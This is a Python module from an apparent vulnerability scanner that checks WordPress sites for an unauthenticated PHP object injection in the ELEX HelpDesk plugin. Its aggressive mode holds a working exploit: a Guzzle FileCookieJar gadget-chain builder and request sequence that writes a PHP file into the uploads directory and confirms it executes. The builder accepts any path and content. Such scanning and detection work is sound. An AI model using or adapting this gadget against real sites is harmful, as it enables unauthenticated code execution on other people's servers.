from __future__ import annotations

import re
import secrets
import urllib.parse
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding

CVE_ID = "CVE-2026-119077"
NAME = "ELEX HelpDesk unauthenticated PHP object injection"
COMPONENT = "ELEX HelpDesk & Customer Support Ticket System"
AFFECTED_RULE = "ELEX HelpDesk 1.0.0 through 3.3.9; fixed in 3.4.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
PLUGIN_SLUG = "elex-helpdesk-customer-support-ticket-system"
AJAX_PATH = "/wp-admin/admin-ajax.php"
MARKER_PREFIX = "PROOFCMS_119077_"
RESERVED_FIELDS = {"request_email", "request_title", "request_description"}
NONCE_RE = re.compile(r'"nonce"\s*:\s*"([a-f0-9]{8,12})"')
AJAX_URL_RE = re.compile(r'"ajax_url"\s*:\s*"([^"]+)"')
FIELD_RE = re.compile(r'name=\\?"([a-zA-Z0-9_]+)')

# Guzzle object-injection gadget. Reimplemented from the MIT-licensed public
# PoC at github.com/im0xfay/CVE-2026-119077 (wsdesk_payload.py).
_JAR = "GuzzleHttp\\Cookie\\CookieJar"
_FILEJAR = "GuzzleHttp\\Cookie\\FileCookieJar"
_SETCOOKIE = "GuzzleHttp\\Cookie\\SetCookie"
_GUARD_OBJECT = (
    'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{s:7:"cookies";a:0:{}'
    's:10:"strictMode";N;s:8:"filename";s:5:"/tmp/x";s:19:"storeSessionCookies";b:1;}'
)


def _s(value: bytes) -> bytes:
    return b's:%d:"' % len(value) + value + b'";'


def _private(prop: str, cls: str) -> bytes:
    return b"\x00" + cls.encode() + b"\x00" + prop.encode()


def _prop(prop: str, cls: str, value: bytes) -> bytes:
    return _s(_private(prop, cls)) + value


def file_cookie_jar(path: str, data: bytes) -> bytes:
    """Serialize a Guzzle FileCookieJar whose destructor writes ``path``."""
    if b'"' in data:
        # Guzzle wraps the value in JSON, so a double quote would escape the
        # PHP block and produce a syntax error instead of executable content.
        raise ValueError("payload must not contain a double quote")
    inner = (
        b"a:3:{" + _s(b"Expires") + b"i:1;" + _s(b"Discard") + b"b:0;"
        + _s(b"Value") + _s(data) + b"}"
    )
    setcookie = b'O:%d:"' % len(_SETCOOKIE) + _SETCOOKIE.encode() + b'":1:{' + _prop("data", _SETCOOKIE, inner) + b"}"
    cookies = b"a:1:{i:0;" + setcookie + b"}"
    props = (
        _prop("cookies", _JAR, cookies)
        + _prop("strictMode", _JAR, b"N;")
        + _prop("filename", _FILEJAR, _s(path.encode()))
        + _prop("storeSessionCookies", _FILEJAR, b"b:1;")
    )
    return b'O:%d:"' % len(_FILEJAR) + _FILEJAR.encode() + b'":4:{' + props + b"}"


def _version_from_readme(body: str) -> str | None:
    match = re.search(r"Stable tag:\s*([0-9]+(?:\.[0-9]+)+)", body or "", re.IGNORECASE)
    return match.group(1) if match else None


def _classify(version: str | None) -> str:
    if not version:
        return "DETECTED_VERSION_UNKNOWN"
    parts = version.split(".")
    try:
        vulnerable = tuple(int(part) for part in parts[:3]) < (3, 4, 0)
    except ValueError:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if vulnerable else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("elex_helpdesk", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="ELEX HelpDesk was not detected through its public manifest or asset paths.", action="No action is required unless the plugin is installed but hidden from public detection.")
    version = info.get("version")
    status = _classify(version)
    detail = f"Detected ELEX HelpDesk {version or '(version unknown)'}; releases up to 3.3.9 unserialize the `form` ticket field without an object guard."
    action = "Upgrade ELEX HelpDesk to 3.4.0 or newer."
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence="HIGH" if version else "MEDIUM", component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _find_support_page(client: HttpClient, base: str, timeout: int) -> tuple[str, str] | None:
    candidates = ["/", "/support", "/support/", "/help", "/helpdesk"]
    candidates.extend(f"/?page_id={pid}" for pid in range(1, 26))
    for path in candidates:
        response = client.get(f"{base}{path}", timeout=timeout)
        if is_transport_error(response):
            continue
        body = str(response.get("body") or "")
        if "wsdesk" not in body.lower():
            continue
        nonce_match = NONCE_RE.search(body)
        if not nonce_match:
            continue
        return path, nonce_match.group(1)
    return None


def run_aggressive_probe(
    target_url: str,
    marker: str = MARKER_PREFIX,
    field: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Build-oracle then inert FileCookieJar marker through the ticket sink.

    3.4.0 runs `eh_crm_has_object_or_serialized_object()` over every parsed form
    value before the custom-field allowlist, so a single throwaway serialized
    value distinguishes a patched build. On vulnerable builds an allowlisted
    custom-field slug carries a Guzzle FileCookieJar object whose destructor
    writes an inert PHP marker into the web-accessible uploads directory.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    page = _find_support_page(client, base, timeout)
    if not page:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{AJAX_PATH}", detail="No page publishing the public `wsdesk_nonce` was found; the ticket endpoint was not probed.", action="Publish a page with the [wsdesk_support] shortcode and retry.")
    support_path, nonce = page
    ajax_url = f"{base}{AJAX_PATH}"

    guard_form = (
        "request_email=proofcms@example.com&request_title=T&request_description=d"
        "&zzzboguskey=" + urllib.parse.quote(_GUARD_OBJECT, safe="")
    )
    guard = client.request(
        ajax_url,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=urllib.parse.urlencode({"action": "eh_crm_new_ticket_post", "nonce": nonce, "form": guard_form}).encode(),
        timeout=timeout,
    )
    if is_transport_error(guard):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=ajax_url, detail=f"The build-oracle request failed in transit ({transport_error_detail(guard)}).", action="Retry when the target is reachable.")
    guard_body = str(guard.get("body") or "")
    if "Invalid form data" in guard_body:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_AFFECTED", confidence="HIGH", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=ajax_url, evidence={"support_path": support_path, "guard": "rejected"}, detail="The 3.4.0 object guard rejected a throwaway serialized form value before any ticket was created.", action="No action is required if the installed version is 3.4.0 or newer.")
    if '"status":"success"' not in guard_body.replace(" ", ""):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=ajax_url, evidence={"support_path": support_path, "guard_body": guard_body[:200]}, detail="The build oracle did not return either the patched rejection or the vulnerable acceptance.", action="Check the support page nonce and the ticket endpoint before retrying.")

    form_response = client.request(
        ajax_url,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=urllib.parse.urlencode({"action": "eh_crm_new_ticket_form", "nonce": nonce}).encode(),
        timeout=timeout,
    )
    slugs: list[str] = []
    if not is_transport_error(form_response):
        slugs = [name for name in FIELD_RE.findall(str(form_response.get("body") or "")) if name not in RESERVED_FIELDS]
    if field:
        slugs.insert(0, field)
    if not slugs:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=ajax_url, evidence={"support_path": support_path, "slugs": slugs}, detail="The build is unpatched but no allowlisted custom-field slug was published; a clean install with only default fields is not exploitable. Pass --aggressive-arg field=<slug> on a lab where one was seeded.", action="Create one custom field in ELEX HelpDesk settings and retry.")

    marker_value = marker + secrets.token_hex(6)
    filename = f"proofcms-119077-{secrets.token_hex(6)}.php"
    path = f"/var/www/html/wp-content/uploads/{filename}"
    payload = file_cookie_jar(path, f"<?php echo '{marker_value}'; ?>".encode())
    payload_enc = urllib.parse.quote(payload.decode("latin1"), safe="")
    form = "&".join([
        "request_email=proofcms@example.com",
        "request_title=ProofCMS",
        "request_description=ProofCMS",
        f"{slugs[0]}={payload_enc}",
    ])
    exploit = client.request(
        ajax_url,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=urllib.parse.urlencode({"action": "eh_crm_new_ticket_post", "nonce": nonce, "form": form}).encode(),
        timeout=timeout,
    )
    if is_transport_error(exploit):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=ajax_url, detail=f"The object-injection request failed in transit ({transport_error_detail(exploit)}).", action="Retry when the target is reachable.")
    if "Invalid form data" in str(exploit.get("body") or ""):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_AFFECTED", confidence="HIGH", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=ajax_url, detail="The object guard rejected the forged FileCookieJar payload.", action="No action is required if the installed version is 3.4.0 or newer.")

    readback = client.get(f"{base}/wp-content/uploads/{filename}", timeout=timeout)
    marker_found = not is_transport_error(readback) and marker_value in str(readback.get("body") or "")
    evidence = {
        "support_path": support_path,
        "inject_slug": slugs[0],
        "marker": marker_value,
        "upload_filename": filename,
        "marker_found": marker_found,
        "readback_status": readback.get("status") if not is_transport_error(readback) else 0,
    }
    if marker_found:
        return Finding(cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=ajax_url, evidence=evidence, detail="A forged Guzzle FileCookieJar object reached the unserialize() sink and its destructor wrote an inert PHP marker into the web-accessible uploads directory, where it executed. No command was run.", action="Upgrade ELEX HelpDesk to 3.4.0 or newer and audit wp-content/uploads for unexpected PHP files.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="HIGH", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=ajax_url, evidence=evidence, detail="The forged object was accepted but the marker was not read back; uploads may not be executable or the write path may differ.", action="Check the uploads directory permissions and web server configuration.")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/wp-content/plugins/{PLUGIN_SLUG}/readme.txt"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=url, detail=f"The plugin manifest could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    version = _version_from_readme(str(response.get("body") or ""))
    status = _classify(version)
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence="MEDIUM", component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=url, detail=f"Read plugin version {version or '(unknown)'} from the public readme; no object-injection payload was sent in safe mode.", action="Upgrade to 3.4.0 or newer if the version is affected.")


def check(target_url: str, cms_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    if not run_exploit_check:
        return passive_result(plugins)
    if exploit_mode == "aggressive":
        return run_aggressive_probe(
            target_url,
            marker=aggressive_value(aggressive_args, aggressive_command, "marker") or MARKER_PREFIX,
            field=aggressive_value(aggressive_args, aggressive_command, "field"),
            timeout=timeout,
            proxy=proxy,
        )
    result = run_safe_probe(target_url, timeout, proxy)
    result.detail += " This module supports safe (manifest version) and aggressive (forged-object upload) modes."
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "wordpress", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_versions": ["<=3.3.9"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Deserialization / Code Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-20", "updated": "2026-11-20", "required_detectors": [], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-119077", "https://github.com/im0xfay/CVE-2026-119077", "https://github.com/advisories/GHSA-9q2c-g54m-wgqw"]}
